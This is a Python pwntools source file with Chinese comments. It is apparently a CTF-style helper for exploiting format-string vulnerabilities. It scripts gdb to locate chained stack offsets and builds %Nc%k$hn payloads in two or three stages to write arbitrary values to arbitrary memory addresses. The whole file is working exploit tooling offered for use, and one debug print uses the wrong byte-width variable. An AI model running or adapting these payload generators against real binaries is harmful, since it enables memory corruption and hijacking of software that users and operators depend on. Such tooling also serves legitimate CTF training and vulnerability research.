from pwn import process
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RED = '\033[31m'
    BLUE = '\033[34m'
    ORANGE = '\033[33m'

def colord(color, content):
    return color + content + '\033[0m'

class Format_Attack:

    def __init__(self, flag=0b111, arch='amd64'):
        # The flag is made up of three different bits, Each bits has different role
        # The first bit is to open verbose information of payload and the third bits is rely on the first
        # The second contorls the display of times
        # The third will open more detailed payload's information
        self.flag = flag  # Included in [0b000,0b001,0b010,0b011,0b100,0b101,0b110,0b111]
        self.stackaddress = 0
        self.arch = arch
        self.times = 1

    def P2T(self,p,match=None,BreakAfterMatch=None):
        res=[]
        try:
            line=p.recvline(timeout=1)
            while line != b'':
                if match:
                    if match in str(line):
                        res.append(line.decode())
                        if BreakAfterMatch: return res
                else:
                    res.append(line.decode())
                try:
                    line=p.recvline(timeout=1)
                except EOFError:
                    return res
        except EOFError:
            print(colord(bcolors.RED,'[-]')+" No message could be recived")
        return res
    
    # def P2T_Betw(self,p,match1=None,match2=None):
    #     res=[]
    #     try:
    #         line=p.recvline(timeout=1)

    #     except EOFError:
    #         print(colord(bcolors.RED,'[-]')+" No message could be recived")
    #     return res

    def CheckFuncStakInfo(self,BinaryName,DesFunc=None,DesFunc_Addr=None,DesFunc_Off=None,stack_info_count=30,Handler_Func=None,**kwargs):
        if not DesFunc:
            print(colord(bcolors.RED,'[-]')+" Set DesFunc first")
            exit()
        desfunc_addr=0
        p=process(f'gdb {BinaryName}',shell=True)
        # 判断PIE
        self.P2T(p)
        p.sendline(b'checksec')
        p.recvline()
        Checksec=p.recvline().decode()
        PIE_STATE=True if 'PIE enabled' in Checksec else False
        NX_STATE=True if 'NX enabled' in Checksec else False
        CANARY_STATE=True if 'Canary found' in Checksec else False
        # 尝试获取main_addr
        if PIE_STATE:
            #如果没给Main_Off,尝试使用p main打印main函数地址,若未加载函数表，提示给出Main_Off
            if not DesFunc_Off:
                p.sendline(f'start\np {DesFunc}'.encode())
                cache=self.P2T(p,'$1',BreakAfterMatch=True)
                if len(cache) == 0:
                    print(colord(bcolors.RED,'[-]')+f' No symbol table found, {colord(bcolors.BOLD,DesFunc)} offset needed')
                    exit()
                desfunc_addr=int(cache[0].split()[-2][5:-3],16)
            else:
                # 如果给了Main_Off，直接打印vmmap，获取ELF文件基地址，通过Main_Off获取main函数地址
                p.sendline(b'start\nvmmap')
                self.P2T(p,'Size Offset File',BreakAfterMatch=True)
                # print(p.recvline().split())
                ELF_addr=int(p.recvline().split()[1].decode(),16)
                # 清空剩余vmmap内容
                self.P2T(p)
                # print(hex(ELF_addr))
                # 如果没有Main_Off，报错退出
                # if not Main_Off:
                #     print(colord(bcolors.RED,'[-]')+' Main_Off Needed')
                #     exit()
                desfunc_addr=DesFunc_Off+ELF_addr
                # print(hex(main_addr))
        else:
            if DesFunc_Addr:
                desfunc_addr=DesFunc_Addr
            else:
                p.sendline(f'start\np {colord(bcolors.BOLD,DesFunc)}'.encode())
                cache=self.P2T(p,'$1',BreakAfterMatch=True)
                if len(cache) == 0:
                    print(colord(bcolors.RED,'[-]')+f' No symbol table found, You need find {colord(bcolors.BOLD,DesFunc)} by yourself')
                    exit()
                desfunc_addr=int(cache[0].split()[-2][5:-3],16)
                # self.P2T(p,'Size Offset File',BreakAfterMatch=True)
                # main_addr=int(p.recvline().split()[2].decode(),16)
        print(colord(bcolors.RED,'[+]')+f' {colord(bcolors.BOLD,DesFunc)} Address: {hex(desfunc_addr)}')
        # 使程序执行到main，并获取main的栈帧附近详细内容
        p.sendline(f'b *{hex(desfunc_addr)}\nc\nsi 5'.encode())
        self.P2T(p)
        p.sendline(f'stack {stack_info_count}'.encode())
        stack_info=self.P2T(p)
        stack_info[0]=stack_info[0][34:]
        print(colord(bcolors.RED,'[+]')+colord(bcolors.BOLD,f' Stack Info Of {DesFunc}'))
        for i in stack_info:print(i,end='')
        # for i in stack_info:print(i.encode()[63:])
        # 获取栈地址在数据中首次出现的位置
        # stack_info_first=0
        # for i in stack_info[0].split():
        #     if '\x1b[33m' in i:
        #         break
        #     stack_info_first+=1
        # print(stack_info_first)
        # 获取rsp的值
        # rsp_reg=int(stack_info[0].split()[2][5:-8],16)
        # 通过审查Stack，获取合适的off1与off2
        # 首先获取栈地址在数据中首次出现的位置，第一次为rsp，可以直接获取
        # 然后判断是否重复出现三次栈地址
        # 若出现，则记录off1与off2
        off_lis={}
        rsp_reg=0
        for i in range(len(stack_info)):
            flag=True
            have=False
            stack_info_first=0
            cache=stack_info[i].split()
            for j in cache:
                if '\x1b[33m' in j:
                    have=True
                    break
                stack_info_first+=1
            if i == 0:
                rsp_reg=int(cache[stack_info_first][5:-8],16)
            if not have:
                continue
            for j in range(0,5,2):
                if stack_info_first+j > len(cache)-1:
                    flag=False
                    break
                if '\x1b[33m' not in stack_info[i].split()[j+stack_info_first]:
                    flag=False
                    break
            if flag:
                off1=(int(cache[stack_info_first][5:-8],16)-rsp_reg)//8+6
                off2=(int(cache[stack_info_first+2][9:-8],16)-rsp_reg)//8+6
                off_lis[str(len(off_lis))]=[off1,off2]
                print(colord(bcolors.RED,'[+]')+f' Off1: {off1}, Off2: {off2}')

            # cache=stack_info[i].encode()[63:].decode().split()
            # for j in range(0,5,2):
            #     if '\x1b[33m' in cache[j]:
            #         continue
            #     flag=False
            #     break    
            # if flag:
            #     off1=(int(cache[0][5:-8],16)-rsp_reg)//8+6
            #     off2=(int(cache[2][9:-8],16)-rsp_reg)//8+6
            #     break
        # print(colord(bcolors.RED,'[+]')+f' Off1: {off1}, Off2: {off2}')
        



        # 判断有没符号表
        # p.sendline('p main')
        # if_main=self.P2T(p,'$1',BreakAfterMatch=True)
        # print(if_main)

        # if len(if_main) == 0:
        #     # GetAddr()
        #     p.sendline(b'start\nvmmap')
        #     self.P2T(p,'Size Offset File',BreakAfterMatch=True)
        #     ELF_addr=int(p.recvline().split()[2].decode(),16)
        #     print(hex(ELF_addr))
        #     if not Main_Off:
        #         print(colord(bcolors.RED,'[-]')+' Need Main_Off')
        #         exit()
        #     main_addr=Main_Off+ELF_addr
        #     print(hex(main_addr))
        # else:
        #     main_addr=
        #     print('main')
        
        p.interactive()

    def TwoOffFormat(self,
                     value,
                     address,
                     off1,
                     off2,
                     bytes_off=2,
                     prefix_str_len=0,
                     address_bytes_off=None,
                     value_bytes_off=None,
                     func_send=None,
                     **kwargs):
        if not func_send:
            print(
                colord(bcolors.RED, '[-]') + ' No ' +
                colord(bcolors.BOLD, 'func_send') + ' found!')
            exit()
        # print(bytes_off not in [1,2,4])
        # print((address_bytes_off is not None and (address_bytes_off not in [1,2,4])))
        # print(address_bytes_off is not None)
        # print((address_bytes_off not in [1,2,4]))
        # print((value_bytes_off is not None and (value_bytes_off not in [1,2,4])))
        # print(value_bytes_off is not None)
        # print(value_bytes_off not in [1,2,4])
        if (bytes_off not in [1, 2, 4
                              ]) or (address_bytes_off is not None and
                                     (address_bytes_off not in [1, 2, 4])) or (
                                         value_bytes_off is not None and
                                         (value_bytes_off not in [1, 2, 4])):
            print(
                colord(bcolors.RED, '[-]') +
                ' bytes_off can only be selected from ' +
                colord(bcolors.BOLD, '1,2,4'))
            exit()
        # address_bytes_off 来指定 payload1的bytes_off,value_bytes_off 来指定 payload2的bytes_off
        # bytes_off can only be selected from 1,2,4
        # func 为数据输入函数,需要自己写
        # 格式如下：
        # def func(payload=None, **kwargs):
        #   if not payload: return
        #   p.sendafter(b'something',kwargs['length'])
        #   p.sendafter(b'finish',payload)
        # off1 和 off2是栈上两个以链表形式相连的关于rsp的偏移量
        # address 是要更改的地址，change_2函数中，会根据bytes_off来选择address的前偏移字节，然后以此更改off2所指的值
        # address 在本函数中只能以栈地址的形式出现
        # value 是需要更改的值
        # 本函数要求格式化字符串无限执行才可
        print(
            colord(bcolors.RED, f'[+]') +
            f' Now, We are changing the value of ' +
            colord(bcolors.BOLD, hex(address)) + ' to ' +
            colord(bcolors.BOLD, hex(value)))
        while value:
            if self.flag & 0b010:
                print(
                    colord(bcolors.BLUE, '[+]') +
                    colord(bcolors.BOLD, ' The ' + str(self.times) +
                           'th time'))
            else:
                print(colord(bcolors.BLUE, '[+]'))
            # 所需覆盖地址的写入
            cache1 = bytes_off if not address_bytes_off else address_bytes_off
            payload1 = b'%' + str((address & (
                0xffffffff >> (32 - 8 * cache1)))-prefix_str_len).encode() + b'c%' + str(
                    off1).encode() + b'$' + b'h' * (2 - cache1 // 2) + b'n'
            try:
                func_send(payload=payload1, **kwargs)
                if self.flag & 0b001:
                    if self.flag & 0b100:
                        print('\t' + payload1.decode() + '\t---\t' +
                              hex(address & (0xffffffff >> (32 - 8 * cache1))) + " + " + str(prefix_str_len) + " = "+ hex((address & (0xffffffff >> (32 - 8 * cache1)))+prefix_str_len))
                    else:
                        print('\t' + payload1.decode())
            except:
                print(
                    colord(bcolors.RED, '[-]') +
                    f' An error occurred when the program was executed to the '
                    + colord(bcolors.BOLD, 'first') + ' stage of the ' +
                    colord(bcolors.BOLD, str(self.times)) + 'th time!')
                exit()
            # 将值写入上部分所覆盖的地址
            cache2 = bytes_off if not value_bytes_off else value_bytes_off
            payload2 = b'%' + str((value & (
                0xffffffff >> (32 - 8 * cache2)))-prefix_str_len).encode() + b'c%' + str(
                    off2).encode() + b'$' + b'h' * (2 - cache2 // 2) + b'n'
            try:
                func_send(payload=payload2, **kwargs)
                if self.flag & 0b001:
                    if self.flag & 0b100:
                        print('\t' + payload2.decode() + '\t---\t' +
                              hex(value & (0xffffffff >> (32 - 8 * cache2))) + " + " + str(prefix_str_len) + " = "+ hex((value & (0xffffffff >> (32 - 8 * cache1)))+prefix_str_len))
                    else:
                        print('\t' + payload2.decode())
            except:
                print(
                    colord(bcolors.RED, '[-]') +
                    f' An error occurred when the program was executed to the '
                    + colord(bcolors.BOLD, 'second') + ' stage of the ' +
                    colord(bcolors.BOLD, str(self.times)) + 'th time!')
                exit()
            #! 信息打印,已废弃
            # res=colord(bcolors.BLUE,'[+]')
            # if self.flag & 0b010:
            #     res+=colord(bcolors.BOLD,' The '+str(self.times)+'th time')
            # print(colord(bcolors.BLUE,'[+] '),colord(bcolors.BLUE,str(times)+'th time'))
            # if self.flag & 0b001:
            #     # res+=colord(bcolors.ORANGE,'\n=> ')
            #     res+='\n\t'+payload1.decode()
            #     if self.flag & 0b100: res+='\t---\t'+hex(address&(0xffffffff>>(32-8*bytes_off)))
            #     # res+=colord(bcolors.ORANGE,'\n=> ')
            #     res+='\n\t'+payload2.decode()
            #     if self.flag & 0b100: res+='\t---\t'+hex(value&(0xffffffff>>(32-8*bytes_off)))
            #     # print(colord(bcolors.BLUE,'\n'+payload1.decode()))
            #     # print(colord(bcolors.BLUE,payload2.decode()))
            # print(res)
            # 变量更迭
            value >>= 8 * cache2
            address += cache2
            self.times += 1
        print(colord(bcolors.RED, '[+]') + ' Change Complete')

    def ThreeOffFormat(self,
                       value,
                       address,
                       off3_address,
                       off1,
                       off2,
                       off3,
                       bytes_off=2,
                       first_address_bytes_off=None,
                       first_value_bytes_off=None,
                       second_address_bytes_off=1,
                       second_value_bytes_off=1,
                       func_send=None,
                       **kwargs):
        print(
            colord(bcolors.WARNING, '[+]') +
            colord(bcolors.BOLD, ' ThreeOffFormat Mode'))
        # 将所需写入的地址（不在栈上的地址）先行写进栈中的off3_address
        # 之所以要将address写进off3后面，是因为格式化字符串最合适修改长度为2个字节，如果想要直接将address写进off3之中，
        # 因为off3的高地址字节与address的高地址字节不匹配，所以无法直接进行修改，需要先将address完整写入栈中才可以修改address地址下的值
        self.TwoOffFormat(address,
                          off3_address,
                          off1,
                          off2,
                          bytes_off=bytes_off,
                          address_bytes_off=first_address_bytes_off,
                          value_bytes_off=first_value_bytes_off,
                          func_send=func_send,
                          **kwargs)
        # 还原链的第三个节点为off3_address,使之形成： off1_address -> off2_address -> off3_address -> address 的状态，
        # 这样，我们就能通过控制off2和off3进行任意地址写任意长度的value了
        print(
            colord(bcolors.RED, '[+]') + ' Now, The ' +
            colord(bcolors.BOLD, 'third node') +
            ' of the link is being recovered')
        cache = bytes_off if not first_address_bytes_off else first_address_bytes_off
        payload = b'%' + str(off3_address & (
            0xffffffff >> (32 - 8 * cache))).encode() + b'c%' + str(
                off1).encode() + b'$' + b'h' * (2 - cache // 2) + b'n'
        try:
            func_send(payload=payload, **kwargs)
            print(colord(bcolors.RED, '[+]') + ' Done')
        except:
            print(
                colord(bcolors.RED, '[-]') +
                f' An error occurred when the program was executed after the '
                + colord(bcolors.BOLD, str(self.times)) + 'th time!')
            exit()
        # 现在的状态为： off2_address -> off3_address -> address
        # 忽略off1_address
        # 即可进行address地址附近值的修改
        self.TwoOffFormat(value,
                          address,
                          off2,
                          off3,
                          bytes_off=bytes_off,
                          address_bytes_off=second_address_bytes_off,
                          value_bytes_off=second_value_bytes_off,
                          func_send=func_send,
                          **kwargs)


# def change_3(value,address,off3_address,off1,off2,off3,bytes_off,func_send,**kwargs):
#     change_2(address,off3_address,off1,off2,bytes_off,func_send,**kwargs)
#     payload=b'%'+str(off3_address&(0xffffffff>>(32-8*bytes_off))).encode()+b'c%'+str(off1).encode()+b'$'+b'h'*(2-bytes_off//2)+b'n'
#     func_send(payload=payload,**kwargs)
#     change_2(value,address,off2,off3,bytes_off,func_send,**kwargs)

# def change_2(value,address,off1,off2,bytes_off,func_send,**kwargs):
#     # bytes_off can only be selected from 1,2,4
#     # func 为数据输入函数
#     # off1 和 off2是栈上两个以链表形式相连的关于rsp的偏移量
#     # address 是要更改的地址，change_2函数中，会根据bytes_off来选择address的前偏移字节，然后以此更改off2所指的值
#     # address 在本函数中只能以栈地址的形式出现
#     # value 是需要更改的值
#     # 本函数要求格式化字符串无限执行才可
#     while value:
#         # print(kwargs)
#         payload=b'%'+str(address&(0xffffffff>>(32-8*bytes_off))).encode()+b'c%'+str(off1).encode()+b'$'+b'h'*(2-bytes_off//2)+b'n'
#         func_send(payload=payload,**kwargs)
#         print(payload)

#         payload=b'%'+str(value&(0xffffffff>>(32-8*bytes_off))).encode()+b'c%'+str(off2).encode()+b'$'+b'h'*(2-bytes_off//2)+b'n'
#         func_send(payload=payload,**kwargs)
#         print(payload)

#         value>>=8*bytes_off
#         address+=bytes_off
